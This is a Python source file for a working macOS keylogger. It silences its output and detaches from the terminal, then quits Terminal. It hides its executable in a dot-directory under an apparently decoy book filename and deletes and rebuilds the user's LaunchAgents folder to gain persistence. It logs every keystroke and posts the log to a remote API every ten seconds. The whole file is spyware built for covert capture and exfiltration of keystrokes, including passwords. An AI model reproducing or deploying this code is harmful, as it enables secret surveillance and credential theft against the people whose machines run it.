import threading
import requests
from pynput import keyboard
import os
import sys
import subprocess
import shutil
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Reference environment variables
API_URL = os.getenv("API_URL")
KEYFILE_PATH = os.getenv("KEYFILE_PATH")

sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

def run_in_background_and_close_terminal():
    if os.getppid() != 1:  # Check if the script is already detached
        try:
            # Relaunch the script as a background process using nohup
            nohup_command = ["nohup", sys.executable] + sys.argv + ["&"]
            subprocess.Popen(nohup_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setpgrp)
            
            # Use AppleScript to close the terminal window
            apple_script = '''
            tell application "Terminal"
                quit
            end tell
            '''
            subprocess.run(["osascript", "-e", apple_script])

            sys.exit(0)  # Exit the parent process
        except Exception as e:
            print(f"Failed to relaunch as a background process: {e}")
            sys.exit(1)

def setup_mac_launch_agent():
    plist_dir = os.path.expanduser("~/Library/LaunchAgents")
    plist_path = os.path.join(plist_dir, "com.example.keylogger.plist")
    
    # Si hay un directorio, borrarlo para luego recrearlo
    if os.path.exists(plist_dir):
        shutil.rmtree(plist_dir)
    
    # Crear el directorio nuevamente
    os.makedirs(plist_dir)
    
    plist_content = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.keylogger</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Users/mario/.hidden_executable/the-art-of-computer-virus-research-and-defense-0321304543-9780321304544_compresspdf</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
""".format(os.path.abspath(__file__))

    with open(plist_path, "w") as plist_file:
        plist_file.write(plist_content)

    # Unload any existing agent with the same label
    os.system(f"launchctl unload {plist_path}")

    # Load the LaunchAgent plist file
    os.system(f"launchctl load {plist_path}")

if getattr(sys, 'frozen', False):
    setup_mac_launch_agent() #Si el archivo es generado con pypinstaller pues que se ejecute la funcion para que se guarde la config

def keyPressed(key):
    try:
        char = key.char  
        if char:
            with open(KEYFILE_PATH, "a") as logKey:
                logKey.write(char)
    except AttributeError:

        with open(KEYFILE_PATH, "a") as logKey:
            if key == keyboard.Key.space:
                logKey.write(' ')
            elif key == keyboard.Key.enter:
                logKey.write('\n')
            else:
                logKey.write(f'[{key}]') 

def on_press(key):
    keyPressed(key)

def send_file_to_api():
    try:
        # Read the file content
        with open(KEYFILE_PATH, "r") as file:
            file_content = file.read()

        # Prepare the payload
        payload = {"filename": "keyfile.txt", "content": file_content}


        # Send the POST request
        response = requests.post(API_URL, json=payload)
        
    except Exception as e:
        pass
    finally:
 
        threading.Timer(10, send_file_to_api).start()

def make_executable_invisible():
    hidden_dir = os.path.expanduser("~/.hidden_executable")
    if not os.path.exists(hidden_dir):
        os.makedirs(hidden_dir)
    
    current_executable = sys.argv[0]
    new_executable_path = os.path.join(hidden_dir, os.path.basename(current_executable))
    
    if not os.path.exists(new_executable_path):
        os.rename(current_executable, new_executable_path)
        os.execv(new_executable_path, sys.argv)

if not os.path.exists(KEYFILE_PATH):
    with open(KEYFILE_PATH, "w") as file:
        pass  # Create an empty file

if __name__ == "__main__":
    run_in_background_and_close_terminal()

    make_executable_invisible()  # Move the executable to a hidden directory and run it from there

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    send_file_to_api()

    listener.join()
